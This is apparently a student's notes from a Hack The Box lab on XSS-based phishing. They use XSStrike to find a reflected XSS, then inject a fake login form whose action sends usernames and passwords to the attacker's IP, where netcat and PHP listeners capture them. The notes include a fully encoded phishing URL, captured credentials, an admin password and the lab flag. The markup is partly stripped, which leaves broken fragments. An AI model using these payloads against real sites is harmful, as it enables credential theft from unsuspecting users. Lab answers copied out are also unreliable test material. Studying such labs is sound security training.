# 06 phishing

## XSS Discovery

git clone https://github.com/s0md3v/XSStrike.git cd XSStrike pip install -r requirements.txt python xsstrike.py

## Login Form Injection

OUR\_IP = ip of our VM

### Please login to continue

&#x20;&#x20;

document.write('

### Please login to continue

\<form id='urlform' action=http://OUR\_IP>');

## Cleaning Up

document.getElementById('urlform').remove();

document.write('

### Please login to continue

\<form id='urlform' action=http://OUR\_IP>');document.getElementById('urlform').remove();

## Credential Stealing

python3 -m http.server 80

sudo nc -lvnp 80

connect to \[10.10.XX.XX] from (UNKNOWN) \[10.10.XX.XX] XXXXX GET /?username=test\&password=test\&submit=Login HTTP/1.1 Host: 10.10.XX.XX ...SNIP...

Create a PHP file so the user won't get an HTTP error

mkdir /tmp/tmpserver cd /tmp/tmpserver vi index.php

sudo php -S 0.0.0.0:8081

cat creds.txt Username: test | Password: test

## LAB

http://10.129.218.230/phishing/

http://10.129.218.230/phishing/index.php?url=test

### XSS Discovery

git clone https://github.com/s0md3v/XSStrike.git cd XSStrike pip install -r requirements.txt python xsstrike.py

python xsstrike.py -u "http://10.129.218.230/phishing/index.php?url=test"

## \[~~] Checking for DOM vulnerabilities \[+] WAF Status: Offline \[!] Testing parameter: url \[!] Reflections found: 1 \[~~] Analysing reflections \[\~] Generating payloads \[!] Payloads generated: 3096

\[+] Payload: '>\<Html%09ONmoUSeOver+=+\[8].find(confirm)%0dx// \[!] Efficiency: 100 \[!] Confidence: 9 \[?] Would you like to continue scanning? \[y/N]

### Test Reflected XSS

alert(window.origin)

\--> Failed

'>alert(window.origin)//

\--> OK

### Login Form Injection

mkdir /tmp/tmpserver cd /tmp/tmpserver vi index.php

sudo php -S 0.0.0.0:8081

'>document.write('

### Please login to continue

\<form id='urlform' action=http://10.10.15.90:8081>');//

\--> Form OK

cat /tmp/tmpserver/creds.txt Username: yanis | Password: nisya

### Phishing

http://10.129.218.230/phishing/send.php

Add URL :

http://10.129.218.230/phishing/index.php?url=%27%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+id%3D%27urlform%27+action%3Dhttp%3A%2F%2F10.10.15.90%3A8081%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B%2F%2F+

cat /tmp/tmpserver/creds.txt Username: yanis | Password: nisya Username: admin | Password: p1zd0nt57341myp455

http://10.129.218.230/phishing/login.php

HTB{r3f13c73d\_cr3d5\_84ck\_2\_m3}

### Cleaning Up

http://10.129.218.230/phishing/

'document.write('

### Please login to continue

\<form id='urlform' action=http://10.10.15.90:8081>;document.getElementById('urlform').remove();//

???
